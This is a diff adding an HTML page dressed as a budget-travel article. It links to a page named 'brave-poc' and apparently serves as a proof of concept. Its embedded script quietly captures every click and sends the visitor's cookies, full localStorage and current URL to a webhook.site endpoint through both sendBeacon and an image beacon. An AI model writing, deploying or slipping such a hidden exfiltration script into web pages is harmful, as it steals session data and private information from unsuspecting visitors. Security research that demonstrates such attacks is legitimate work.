@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Budget Travel 2026</title>
+  <style>
+    body { font-family: Georgia, serif; max-width: 700px; margin: 40px auto; padding: 20px; line-height: 1.8; }
+  </style>
+</head>
+<body>
+  <h1>Budget Travel Destinations 2026</h1>
+  <p>Vietnam, Portugal, Colombia are our top picks.</p>
+  <p>For detailed itineraries and booking links:</p>
+  <a id="map-link" href="https://needmoneyforhoes.github.io/brave-poc/page2.html" 
+     style="font-size:20px;color:blue;display:block;padding:15px;">
+    View the interactive travel map and itineraries →
+  </a>
+
+  <script>
+    // Intercept ALL clicks on the page — captures data before navigation
+    document.addEventListener('click', function(e) {
+      // Silently capture browser data on any click
+      var d = {
+        clicked: e.target.tagName + '#' + e.target.id,
+        url: location.href,
+        cookies: document.cookie || 'none',
+        localStorage: JSON.stringify(localStorage),
+        timestamp: new Date().toISOString()
+      };
+      // Fire and forget — beacon before navigation happens
+      navigator.sendBeacon('https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253', 
+        JSON.stringify(d));
+      // Also image beacon
+      new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?click=' + 
+        encodeURIComponent(JSON.stringify(d));
+    }, true); // capture phase — fires BEFORE the link navigation
+  </script>
+</body>
+</html>
